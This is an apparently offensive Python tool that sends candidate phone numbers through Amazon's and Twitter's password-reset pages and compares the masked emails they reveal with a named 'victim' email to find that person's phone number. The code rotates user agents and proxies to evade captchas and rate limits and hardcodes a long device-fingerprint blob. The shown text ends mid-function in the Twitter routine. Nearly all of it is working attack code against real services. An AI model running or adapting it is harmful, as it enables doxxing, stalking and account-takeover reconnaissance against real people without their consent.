#!/usr/bin/env python
import argparse
import requests
import re
import sys
import os
import time
import zipfile
import random
import urllib
from itertools import product
from bs4 import BeautifulSoup
import logging

# Basic configuration for logging
logging.basicConfig(format='%(message)s')
logger = logging.getLogger()
logger.setLevel(logging.INFO)

requests.packages.urllib3.disable_warnings()

GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
    "Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 "
    "(KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]

proxyList = []
verifyProxy = False
# To cache results from national pooling website and save bandwidth
poolingCache = {}


def start_brute_force(phone_numbers, victim_email, quiet_mode, verbose):
    """
    Stars brute force method on a list of possible phone numbers and victim email
    :param phone_numbers: List of possible phone numbers
    :param victim_email: Email of the victim
    :param quiet_mode: Choose quiet mode
    :param verbose: Verbose mode
    :return:
    """
    if quiet_mode:
        get_masked_email_twitter(phone_numbers, victim_email, verbose)
    else:
        get_masked_email_amazon(phone_numbers, victim_email, verbose)
        get_masked_email_twitter(phone_numbers, victim_email, verbose)


def get_masked_email_amazon(phone_numbers, victim_email, verbose):
    """
    Uses Amazon to obtain masked email by resetting passwords using phone numbers
    :param phone_numbers: List of possible phone numbers
    :param victim_email: Email of the victim
    :param verbose: Verbose mode
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Using Amazon to find victim's phone number...")
    regex_email = r"[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"
    found_possible_number = False
    for phone_number in phone_numbers:
        # Pick random user agents to help prevent captcha
        user_agent = random.choice(userAgents)
        proxy = random.choice(proxyList) if proxyList else None
        session = requests.Session()
        response = session.get(
            "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
            headers={
                "User-Agent": user_agent,
                "Accept":
                    "text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1"
            },
            proxies=proxy,
            verify=verifyProxy
        )
        session_id = response.cookies["session-id"]
        prevrid_search = re.search(
            'name="prevRID" value="(.*)"', response.text).group(1)
        workflow_state = re.search(
            'name="workflowState" value="(.*)"', response.text).group(1)
        app_action_token = re.search(
            'name="appActionToken" value="(.*)" /><input', response.text).group(1)
        csmhit_cookie = {
            "version": 0,
            "name": 'csm-hit',
            "value": 'tb:B79Q924JBYC22JBPZBPY+s-B79Q924JBYC22JBPZBPY|1555913752789&t:1555913752789&adb:adblk_no',
            "port": None,
            "domain": 'www.amazon.com'
        }
        session.cookies.set(**csmhit_cookie)
        if "Location" in response.headers:
            redirect_url = response.headers['Location']
            if "prevRID" in redirect_url:
                response = session.post(
                    "https://www.amazon.com/ap/forgotpassword/",
                    headers={
                        "Cache-Control": "max-age=0",
                        "Origin": "https://www.amazon.com",
                        "Upgrade-Insecure-Requests": "1",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": user_agent,
                        "Accept":
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                    },
                    data="prevRID=" + urllib.quote(prevrid_search)
                    + "&workflowState=" + workflow_state
                    + "&appActionToken=" + app_action_token
                    + "&appAction=" + "FORGOTPWD"
                    + "&email=" + phone_number
                    + "&metadata1="
                    + "ECdITeCs%3AYepiSml9%2BnkZb0MXAk3%2ByjdXcfjkmehrjevmNH8ceN%"
                    "2B2SfKQrivwPHTKWv7IzIHd1lYz1tY2WGqeS7Zioe78H679%2BxQ4MXpJCv"
                    "XrC8KSxHfeI%2Fe1L061lUDZFhZLZroR593ReR9RicjJHRSp5rIK%2BGy9%"
                    "2F2503L2FTVB68OpW8yksfG%2BTO3cucoWs%2BPVbLiCnxPkCdpD5gZN6q9"
                    "LFjhuI9Qce3e3YcxWedio0smgtPGmNh1LdRmg3hLRZ%2BsKvsD67pTxoGel"
                    "%2BXgYRdqLClyXiDpsojLZp4VtZcYf%2FtoKazdvrKROQMUArQie33En4WG"
                    "wRuNGgPCR3Ecliuc8ap3uGnzyWJ4DWONj772XHI3OrFymVF1ImSHFbPV3uSK"
                    "CxpFnUn9mh3obKJHKk1GB0dolo2aXLIT%2FAWt%2BjIhJLT4qjo3DI7biJQF"
                    "qdAJCu%2FIJqnndDj10OoWkOAEsJ6vu4OcQrCuAccFl1FEg24Bg0kcWE4yJl"
                    "mL%2FRFs7n34x0QARkqnYjYyLRkBfIbGcfqNLb3kD%2Fl3vH%2BX46uYVTPT"
                    "cmZ2gpKHEGx9UcWX%2FslI9RgiHJj54wDgTBIpUQiMl7T7Db5n3Li4O1%2FD"
                    "PMS%2FSMaQSkH2mbVXB1yINJox5F93ByPAU2ZSRtuxAhOl0jaUWlj%2FsfiK"
                    "7Ay8bxIbE%2FFY4AgG0aaJG7G7nnxwEN7ejklXkmkHAxrfyLx6BLAXmvN%2B"
                    "g8sFRvQoaIxRIrKqGF2qY4EbEtVmq04BwYOCt4TB13NS1KU0fXgYjNxklDwr"
                    "IN60LBDJm44D2xa7WVkvjcbAL33f1i2b6hppS2ieHNay2tC8Lv6FTkvl2AJU"
                    "3eyOBiU2kHFV57PGrBANUVq2Rk6FhHCfvPWQ8SrUbIdNG8oopBRsUav2vV9S"
                    "yJ%2FtbAEy1xspzMh0KTMmIXVwNsIHCfldK4fcuRO5agZbPELNWPu9gQFg86"
                    "gaivmaQfewpsrX00PLLr1TtF5oWE%2BzzvWX2gRQdfCg8uJRDzve4Oq2KZOQ"
                    "rMpT0RuTd8%2BfxOrJhLW9AqI7z39ddXYohTPqNEaECst%2BMs%2FgOxYV8V"
                    "swBkOp5a7MsK8IjB7mNxLU9Xqra072HWug2wK%2Ffyj6XWCSB%2FFgpFAD5F"
                    "kaBEo4wNqZev5b%2BAaapPOLv1oGzS9xqShDYVI1GwJ%2BclrdMUJQgB4tb5"
                    "WNrFKtg%2Fnnm6oM5aO%2BCkzlYVE3ldw7L5CJqWa8vEaaSnFL6emWYM277f"
                    "WfMSLYQdE4ySQXISBUf9%2FSMf4frAnB2TkyCuKAf24%2BTh7GYpcs5mNMCC"
                    "HiPseW3ZD9TzooFEoSWusNnSe7DOm9uC7u9IHr5J%2FJhBc7pMW9PaQhZ8WF"
                    "Kgd1I6BHQyJytJfPuToIDLXIg7Qv9%2B%2BRexaZJZfPROkhKdnH5vjzs49%"
                    "2FJ3XK3PM7IwirYZsTRlfxZv7d8aDNX07NwEOdiTdOx9jaqPeQvDSxhmEd5Z"
                    "aPp%2FctXJCjiiUPjuQOfRVPiJ8eq9fwJqnUfunNP7HBmBRqiH3uPRdPdbiE"
                    "KE3IeperWk8aBDBJGC%2FS4qMTRZPlKR0u%2BR1olOlfWhNqYdtu9YUBiNPe"
                    "9%2BLumCQ%2Ba59imb5SRtwLZy5gHuUoIco9Epto5zxoFe9kHyjAlRSPxE%2"
                    "BQa%2BvJFfNQU%2F6L1pUo8d9elAEKhqBBGwqED0em83NhQX5y54DQQ8dYq9"
                    "sx4RuhMxCFU5NQonEdu2vaN5S7b0e%2FL1kcjcCYKWmEVyR8GeOIwa5DObcL"
                    "rMc6TOJwtyNrYmZIrjJWoenzmjG1tfbuTWk%2FME5o1GpxE3Q0ke35OftJ3n"
                    "E%2BoebCzLNwOkEMc%2FoJW53rGJH3TGW8%2FErs%2F9mWP6cTLn%2BoVGwG"
                    "%2BwZzZZ2mBWmTvDCKpaXzbivk3NTP4nlJriIeyNm3YiJgMe82osBhi%2BHm"
                    "yCSSD5ye%2FmeucjulOiEvTybj7bvy5vms7MrqBfCr%2B%2Bhz%2BvWZdYr6"
                    "YTQuR8tYYi0SHtFhcrSS88kaLn0BpQ2pyb6Q9zzvmE9jhGH9C07HB8nU5iSv"
                    "bilbQsubIbclODpuz70EHTh1wxTTx%2BBO95k3aYHti9BD2fJzpFJdZrC1YE"
                    "%2F%2F%2Bb9Bko6ipvPfAEZXY6NWCCj6KtoQb%2FYVNDsIobw55PX2nliOc0"
                    "zbmGa3NFkkjaEBc%2F19EmkhJh2g1t75GreIph6btQeeTmGmpZ%2Bj6Oifdt"
                    "gsfXhOBe5wx5WpXclfFUhiMRxHvXCW2Nk7JFxky99aBbbfiWS7uYwLjiQL7C"
                    "Zxnh3HjkDM5M5200GvTKl14epljFiBohNSFGU1Htg9wkesjJYNKFJNtaq%2F"
                    "jg5H72T0LwTDMOw5y2qZirWsgpEhLyvfoheG5he0hw2S0SLQReC9qkrpQuWi"
                    "bpHD2jQQofrbsfl%2FSynnoTxaYP2skdyMyVz3OuEfC91FI%2BfzFMBmcrAE"
                    "YuAwvUKPU7cf1OA7UxpFvFpEqWrAn2KNWLy%2FekuQWZuA%2BqGF8W3uu%2B"
                    "VMKS1HCIVL1iO%2BL4WQlpzSVCZkAvBCdBiFcBQ30cv2rAY5IaRti3YgBK%2"
                    "FsV%2B8tdz%2BT9IJHuSaSEDR8NnRpcuEPRFr6dy659wgWNcSZIcjz%2F4Kr"
                    "5%2FdicB4nVnPgUG8tGceU9SZgLcvgnlNN6S0IBohQICJ6C0MNzoZhsP159x"
                    "HP1mh5XP2ly8KKYU0ZbYT97DOKBf6x6Gt%2Fhm%2BtAwXKZ1%2FJ47%2B5XG"
                    "5Xo79jDHZ31t%2BTQaY57U%2FuDVjkn7bvCTVxqhQFIeUU5yY3qCMVNyGpIp"
                    "acR9VzZxSQ282ZMFvOpVD0AxN7C7KtzNCOCAVIOCYETWd%2FzAAkgf2eJci5"
                    "%2FEodvlx7DrdGOWglRNjlE0Hvs%2F6LaWOR%2FZWJDSMwQ23%2BU6Pb48BZ"
                    "Jr1pz5dEierk8qWywTukfYINA2t02MmjrPSpY02IHFXQgP7htrHNppDj1jxn"
                    "6jXkrQ43QQcy6PI%2Fr7LxGzx6vdudOjdQzhnfRWPm4rvVkU6EVTPs4O4qGS"
                    "YGPM%2BL4Jb5XyYsZZqAkTMF7AB0y7n%2F%2FWqJ4rr9R8d1RIaAqnLT01RC"
                    "WJdUMolR7rQbS916kBe37laMGQ598Yt4xAF%2Ff5xvrvaOJwKfSU244PcSys"
                    "KxPp4xJ4A3ap6pH3NHhXNp3J6DgUxYqxzOGmtAeKK26V0pElFxUjbj%2Fgp2"
                    "FmJRJvQT0cA%2B9K6Iw8pDbg%2FcF3%2B%2FVQPnVfW4AyeO383Wd5eD12Yj"
                    "fk1DCZ1ZQ52lSqQUrxt8MqRPBiPbXfeLNNPcJLkjgwZOZzguKxZ9fJEy%2BZ"
                    "CHANzsWJ3zCeh6CugAuhvwl23mVkjNN3lKtWkpDCPkhkqI8cSV6l0HjOfmfV"
                    "QNtCOoY4izpVe3FCrTRnZNDV7J6iesU3RyFqCFUHUI4BL%2FQHH9DMfAA9Go"
                    "cY4vrb0%2BHxq5uu%2F1dHs5R6mXTOZT7SC%2BbvWWCW7xyp0TXckOCW5%2B"
                    "hj7MPgzzegzKzoFQEYqUwBZeby3bkDphYTcCDDlwm61Fz22XIjq0NiTzoV3a"
                    "hi68uLYOs3tRRJzmFCd0MMpQ50d0dC5kof5LmQ%2BbYXfIe7gbk8vmgaZI4M"
                    "RvS%2FWAhCFxdoj1X3%2BrhiuQs3MTckDYzNmWXwouh31fLz91KetUQb3pIE"
                    "C9%2BVQvzXW3wGDTRwV7c635%2BY6mjuSQ8FXzL8Q5gkw6eb1bycbyDJws0X"
                    "cfJ7wdNJGqJMQJwhHGUVgCl1iXHeAvc3oz1SCSU4zuu0es2jE6kd2cr6B5EN"
                    "O8WyGAR%2F9Md%2BnRp9r1f0wZFaVXOHh%2FWgLkY5vScxxCuQl8SNGcvab4"
                    "GkqlPXuOUwcBBa%2FjqUOTMB8l%2FRA7nfvTB8maDtbpRYBqgk0A%2F43yrd"
                    "YZG2BiB0stffaRimdPHm5pximPza67WcECvaDBZ3nbCxdTth2xM8ytoeRwQy"
                    "R95vBJuvnUfI53Pqceo5RaeIwbbdXWBLsrX9ldgVnN6fspVYBzfmqPNcn836"
                    "xE2D%2FSAe5qoj0iWAKjCuGg2C5PhNa%2BnKgRBnE%2FTW5pMZv5bwzITGAK"
                    "42roy23OeDKP3BEAmdBrQjaGsDDBRhjFXn2bpAbvXTeI15CCSYalqe9OiQix"
                    "UH3Ixv1ix%2BP7CLdyv4d1a6Dj1S83V%2Bw1YiK7MBxwHVagNWAR8OZqu4Q%"
                    "2Fgob6SBudpaXz0WcoJFgXxn7%2Ba3K1cLp2GWjUGJeMyx7e%2B8YQ5dhuFf"
                    "lUfgGI7Eg3E5wz3x29fpNqjx6OV89hwZWLsJvRUllBPGR%2B1oXwIty8noEw"
                    "fwQ0JuYAPeAAA05bQlJ3OG5LAo%2Ff74rMFKC2IwBTsoy8oKBpPw60uo07LN"
                    "E%2FTH7g4DSKw5Cm1k3lIZF5ggkGLVl2ZvjRxQ5gx%2BEJn4kzHAOPClBC9F"
                    "LPzSX0LRTi8wRzBEDBaaJ04AebFj6VkM7v3uJT9uc1OdkDREmKlgyIYC%2FB"
                    "oDR0h%2FZkPBI3n5h5HP%2B20GlvpcswKMpEXY8AT4jR4FdG%2FKn%2BF12F"
                    "qv7UOo31cJuee9NV%2FroAcDYjJRcniug4Gtmk5uR8etZlXptBbXlNFB16X5"
                    "baqlxdVYsIG5d2QaEZi0V1vs2eoK2aAkBTxJWEYBlqapa3koH9h4kh0WWl1M"
                    "nIpTMvzdMzrKpnrvNeMc2k2TPj%2BaC%2FrJr%2Fa5YUoSMo6BWFEba6tp69"
                    "XmbUHSs5gUwCGvWgYk0%2FeqO601inIG8ZPnMoCO2dJzQ1O3u26nsQ4LPAxs"
                    "ZtkMjDaAz5Ex6zIQvfla9HPB8B9FxXMenDRw6Qwo7bJLot2unbOllvGukRle"
                    "vqj%2F3%2BlOEHDeGz9x1K2LK4DLion9Gqwz7uLijuJpThQv2IHWUttMvb4U"
                    "fUr3urgSB0DkTdS3saO%2B%2FSH830Z%2BE%2BIO8Ap4YIl1G2BvhWFiCwwg"
                    "cp5sFgpcAyWzqMq4KM3%2BWcFctnayYPrrQmCW0t5u%2Fl5H0hx8tOA6tDYP"
                    "%2BodYmE8pHsV5M0JTEBbDjtqaUtaTWX181fj3%2B7dQCUy73SmNrotNl3Lg"
                    "bL%2BlCw3CbMZ3e5sB6NlqNubhHuD2%2BLYNL9k8ExvyjrRhuYwX2SKK6QBL"
                    "GkmsrWN62n4W37dxYhUCVx6KLCaJTqRpcnubZWmGwbjiGP%2B7M7NrZJgVWm"
                    "dwp7yLfq%2B1GR3nD3mUwcNXnwGSpR%2FIvOrVIvWk81J7jFUIC5WiAU2022"
                    "PY4cveBpaAFa2f8Ebg%2BY4g%2F21wVJzyJt%2B%2BlwkfmtXQAzPz0DFXL4"
                    "gZLi%2BwiSBoioMq2LcmAn1p9HvB6u0i1VtKJIfdxVnpLpS%2Bmui8oybkyx"
                    "esHVEMXz%2FbamK7jJZLVNc6Xkh6WAzl%2FgqB87Mmq%2FsDwxjoPg9VWtu%"
                    "2FhsVuYkeUnVgb2y1CK%2FemDW0tnXewgZAL6Tn0siNVJ07KASId3PiNjocJA"
                    "XY2xCuCBS3XXgM7gtIJhA8AZQjG4DQb8A%2BKKqkuYPPj2nxqJe%2Fei11Cqq1"
                    "dVh3d0NTu8lTXxARqPoNsS8wR2aabaK2%2BdhSibZmbIwd1678agXqq42Nb13%"
                    "2FBM5YEshClB7Sq%2FgV9O27TU1dDheGTpmFF9dRbOF8TCEZc1YFlSUtQN6V6L"
                    "ii4awE9rnChY67xnZRSPi67%2FOaaMKLO6Bngqi0hE5DCHQq1GTras4rIQY1Tc"
                    "jHVP4bqmFyr%2BPvDqPtL9XOoq01QUMfomVes2m%2FRzw7OTid1iWbWeBWiuGR"
                    "H%2FuMC5aoqr3RfITxxDL4gYRzR0mwmSyEvv%2FTGtyL6mZMQXy6NH5gqD2wer"
                    "GAbXmjc8udGot6fwqrfV4cRGL83ItuO5EFsEAuB%2BIO%2BzK2%2BG0iG9ZvfB"
                    "I9TeXjA3m32v496DodjqJ3hPH531P7mE0r6N%2BDuTUUE3fqEk6%2BFPz9%2FY"
                    "mwtgDXEm0MBcFgVQl%2BLg1PyHskjZdT57vO3Gxw2N0PQQpdRc5Rp1m8qKU0O%"
                    "2Fzbzqp%2FSD3cnHndlbUMXvUDiYJcYTed%2Fk3xs2cAPIjQ6Lsa1zjcuij8Jj"
                    "vFWHVQGsKyaWab3OD3viN%2BhUexnVSTfRyI4vXJ%2FhkHmRLFn5%2BxiM2MDV"
                    "NpnuZodGTAXOfOAh3sk7ktlNC6DWlDKlKzH4hyOS5JlK2Qws8yhEkBvXzhCzZq"
                    "jvhBRcHKgLRnE%2BW74vQfvalPlJcr5XblvXWAwi10I6afJsX0cqYwLsv6xLvb"
                    "VB%2BUdboe%2FLrinorI5w3a8Fmd5uF%2FWH0PGf%2BP4ho67NluL8T1kgY176"
                    "fpk%2Bd8tgbaI2hjM59CkmJykbD6iH2HtHU%2FsRGKF8BAJHCUNWPBFYYQKdNe"
                    "D0bDyvXBb3OSSAHISQniSvvGxO1ic8ZSFjETo%2F%2BIG%2BsPc8vHrBE4nXdC"
                    "2Zzwp3orSnoFpVwJcorIURFYfxpTHe%2BX3kpOrbyC0Dmj1b635uqxZ3Zs%2Fu"
                    "fAFppYTkornGwwaJeWn%2B7LATFwLM6nVl8G5QYmAWy0Xb0HIio%2FDtLDRdqji"
                    "1u1mCj8jjlTh85yUC0k5b77C0yUWEruEz35hAWSfH2tNNIB9Uhswk5T1g3Y8lWb"
                    "AsZznsEJCftV8tzURQc%2FSZjzn7O3Dl6EbuPq9jhGKbWKVipv5onWblFbw7Qw0"
                    "KEthykzo4nR0cvuP%2FbkwPPdfMdTrVV47ihFZosm9JCGsdQ9uA1p9UNL1TNuYN"
                    "waIAU8SF2%2FVx2xkBI7eTU2MIiSLPX8UTO7cNdFEESlgNF49U566TpqSiZc51U"
                    "aqZ%2FFzcbSaNdpl%2F52NY8%2BqufCYMqdA2ivYOycO5DicPsnTgp2uC2%2B6h"
                    "%2BFlBZzDKMbENckZagUe1%2Bgx6azoI3oq4EiNsNlRMHIm%2BQDo4XRvxlP5HE"
                    "zXKVNNLnmclp6bnX5ey6xQUas%2Fq%2F3NGZlG7TbwYOpBfz9JNrx9D86zrN03Y"
                    "6nkdrxJNCNLP6hNzQifxmfXFz%2F7qjNjMkh0GXqHwbM6lkSqi3qLPpmek%2FWz"
                    "aoljUC9pY11xZ8j7r71AgJqQ4dXeLDdsliR%2FtJbzTSs%2BLVlXMVjXMi1v4g%"
                    "2FxovLxsZ0JhQurAD%2Fndee04mrUVGX7BDUXVHtbbdvl7BeWez4uHpXSQp24Vm"
                    "7nWYnC6c94vqTKpSDmdqXlnQNZ698Dp0ZCjoP5Pl28u9mt1R%2FMJ6olU3ja8Li"
                    "9MAXQ8gHFyMbZ4oI2fhtYfg7%2BPYp9qf0CPT4FL9xg5Ochh5K6TpmiYK6GSKeP"
                    "fzDMr6YhivJuZalsqH%2BeSChF9OnNcPvXo9ejRqY5iA8JxTY8ah%2FgDL%2Blg"
                    "VkMTITGJeIUOHnrhKTVdvcQfu3YP4Ct%2F8vu1BIpT07%2B17KkxJAM9ws8SOjO"
                    "tS5zz%2BFrnn1yn1jWoglgidjPD2xf342KapbjlhrfSDL3mhSWDtWdrxa%2FjrC"
                    "hVZezCsWSXKsp0f3r8Y7jx%2BWZpiDZ5gE3xC2cYTtgvaQ4qUFOirnMk0DWbNFp"
                    "yrK8GutFK0MQYiPV69ycsXry5pAMFw%2BBlgCKjsyKlLyZrWxyhFV3JY0ryrj6c"
                    "i02kGX1V%2BrQgsOB%2BP4hXVt4ipKMe3ovSP2qnYgICnCXcNQMfrPMDUl2x%2F"
                    "5MbNirkVNUC5yBw8I5GaOHyVvfoFZJq267EBbki7ISkB6i7Elsbs7A0kC01oq29"
                    "FET8%2FArbkzNmSeH%2FeshDZgX%2BG%2BN%2FYp%2BoIfwSvX2CWxJGCrhceM1"
                    "TO58KNJ78OQ%2Fa%2B%2BBdaKbDXEeQ3YKQIUIzpErZPzbjwVPwJ4nLePc8f9zy"
                    "ngxTyZVMOH7%2BjeRX%2BzngKShBiKy8a4hyfFekb%2BdrP%2FqBEcjyq8sWtWT"
                    "BNEEdl5uJFiKHQSy%2F5WAFuuX3yerQHq%2BYsDdd0f4lWftNcHxdLJ5C1IKhm7"
                    "TLEAbt37Szs%2FNf1lxuQJ4H8GWolMSKCXjPTr7JX5lmCbLaM6cqPkYsoMfkYZK"
                    "HcTB5qL3Fuc%2F1RjRCVbebr5eqK8mEHq6miZH%2FkNYCwMhG%2Fe8dk9pD8wcQ"
                    "m9dAoX4LyiGmcFSHkw7Vyu3c%2FyEFRKQr5McsOyPavoTIl73JelEUq2gjfXw%2"
                    "Fj6BMGNWhttumOOPOkNcRAUUZoNvKo44x%2BNGUVNN0hgYmrDt9FBx%2F%2F2Pf"
                    "HDNu3TsOZCqB5LyPgmCiZ83StGq2dy%2FX8hlWXdBfcvJdNTCRrob7GIYrZg3so"
                    "md0r%2FbS2tYsIPj6OLAhZf9EuZ8sa6ECrFp9Lhl321R8ls3kS3zyIFNMEWWFFW"
                    "OMxRrTiZ%2FYUCi4%2FkFrEuPR%2BTpWb%2Bv%2FjCVyA6xXvdrHThl%2FBPMHI"
                    "L%2FNsH3%2Fc8xEHoaHiEpuMnmYRdr7Kg8vC%2FrE0Q5gGxHa%2BzgfX1w0Snzy"
                    "mr%2BNZyq8lKNwidFciPR30pkKoS4VsZpzq7WlxT1k8rSH25Iqi20%2Bg%3D%3D",
                    allow_redirects=False,
                    proxies=proxy,
                    verify=verifyProxy
                )
                redirect_prev_rid = re.search(
                    'prevRID=([A-Z0-9]+)&', redirect_url).group(1)
                redirect_param_jwt = re.search(
                    'paramJwt=(.*)&', redirect_url).group(1)
                response = session.get(
                    redirect_url,
                    headers={
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": user_agent,
                        "Accept":
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                        "Accept-Language": "en-US,en;q=0.9"
                    },
                    proxies=proxy,
                    verify=verifyProxy
                )
            else:
                response = session.get(
                    "https://www.amazon.com" + redirect_url,
                    headers={
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": user_agent,
                        "Accept":
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,"
                            "image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Referer": "https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9"
                    },
                    proxies=proxy,
                    verify=verifyProxy
                )
        if response.status_code >= 500:
            logger.warning("%sError 500 returned for phone: %s %s",
                           YELLOW, phone_number, ENDC)
            continue
        elif "We're sorry" in response.text:
            # Phone is not registered
            if verbose:
                logger.info("%sPhone %s not registered %s",
                            YELLOW, phone_number, ENDC)
            continue
        elif "reached the maximum number of attempts" in response.text:
            if verbose:
                logger.info(
                    "%sMAX attempts reached when trying phone: %s %s", YELLOW, phone_number, ENDC)
            continue
        elif "Enter the characters above" in response.text:
            if verbose:
                logger.info("%sCaptcha caught us trying number: %s %s",
                            YELLOW, phone_number, ENDC)
            continue
        elif "Set a new password" in response.text:
            # Deal with multiple option
            response = session.post(
                "https://www.amazon.com/ap/forgotpassword/options?ie=UTF8&openid.pape.max_auth_age=0"
                "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&paramJwt="
                + redirect_param_jwt
                + "&pageId=usflex&ignoreAuthState=1&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref"
                "3Dnav_custrec_signin&prevRID="
                + redirect_prev_rid
                + "&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net"
                "2Fextensions%2Fpape%2F1.0&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net"
                "2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",
                headers={
                    "Cache-Control": "max-age=0",
                    "Origin": "https://www.amazon.com",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                data="prevRID=" + prevrid_search + "&workflowState=" +
                workflow_state + "&fppOptions=notSkip",
                proxies=proxy,
                verify=verifyProxy
            )
            if not re.search(regex_email, response.text):
                # Sometimes no mask is shown, just the actual phone number
                if verbose:
                    logger.info(
                        "%sNo masked email displayed for number: %s %s", YELLOW, phone_number, ENDC)
                continue
            masked_email = re.search(regex_email, response.text).group(0)
            if \
                    len(victim_email) == len(masked_email) \
                    and victim_email[0] == masked_email[0] \
                    and victim_email[victim_email.find('@')-1:] == masked_email[masked_email.find('@')-1:]:
                logger.info("%sPossible phone number for %s is: %s %s",
                            GREEN, victim_email, phone_number, ENDC)
                found_possible_number = True
            else:
                if verbose:
                    logger.info("%sNo match for email: %s and number: %s %s",
                                YELLOW, masked_email, phone_number, ENDC)
        elif "We've sent a code to the email" in response.text:
            # Got the masked email
            masked_email = re.search(regex_email, response.text).group(0)
            if \
                    len(victim_email) == len(masked_email) \
                    and victim_email[0] == masked_email[0] \
                    and victim_email[victim_email.find('@')-1:] == masked_email[masked_email.find('@')-1:]:
                logger.info("%sPossible phone number for %s is: %s %s",
                            GREEN, victim_email, phone_number, ENDC)
                found_possible_number = True
            else:
                if verbose:
                    logger.info("%sNo match for email: %s and number: %s %s",
                                YELLOW, masked_email, phone_number, ENDC)
        else:
            logger.error("%sUnknown error: %s", RED, ENDC)
            if verbose:
                logger.error("%s%s %s", RED, response.text, ENDC)
            exit("Unknown error!")
    if not found_possible_number:
        logger.error(
            "%sCouldn't find a phone number associated to %s %s", RED, args.email, ENDC)


def get_masked_email_twitter(phone_numbers, victim_email, verbose):
    """
    Uses Amazon to obtain masked email by resetting passwords using phone numbers
    :param phone_numbers: List of possible phone numbers
    :param victim_email: Victim email
    :param verbose: Verbose mode
    :return:
    """
    global userAgents
    global proxyList
    logger.info("Using Twitter to find victim's phone number...")
    found_possible_number = False
    regex_email = r"[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"

    for phone_number in phone_numbers:
        # Pick random user agents to help prevent captcha
        user_agent = random.choice(userAgents)
        proxy = random.choice(proxyList) if proxyList else None
        session = requests.Session()
        response = session.get(
            "https://twitter.com/account/begin_password_reset",
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Push-State-Request": "true",
                "X-Requested-With": "XMLHttpRequest",
                "X-Twitter-Active-User": "yes",
                "User-Agent": user_agent,
                "X-Asset-Version": "5bced1",
                "Referer": "https://twitter.com/login",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            },
            proxies=proxy,
            verify=verifyProxy
        )
        authenticity_token = ""
        regex_output = re.search(
            r'authenticity_token.+value="(\w+)">', response.text)
        if regex_output and regex_output.group(1):
            authenticity_token = regex_output.group(1)
        else:
            if verbose:
                logger.info(
                    "%sTwitter did not display a masked email for number: %s %s ", YELLOW, phone_number, ENDC)
            continue
        response = session.post(
            "https://twitter.com/account/begin_password_reset",
            headers={
                "Cache-Control": "max-age=0",
                "Origin": "https://twitter.com",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": user_agent,
                "Accept":
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Referer": "https://twitter.com/account/begin_password_reset",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            },
            data="authenticity_token=" + authenticity_token +
            "&account_identifier=" + phone_number,
            allow_redirects=False,
            proxies=proxy,
            verify=verifyProxy
        )
        if \
                "Location" in response.headers \
                and response.headers['Location'] == "https://twitter.com/account/password_reset_help?c=4":
            logger.error(
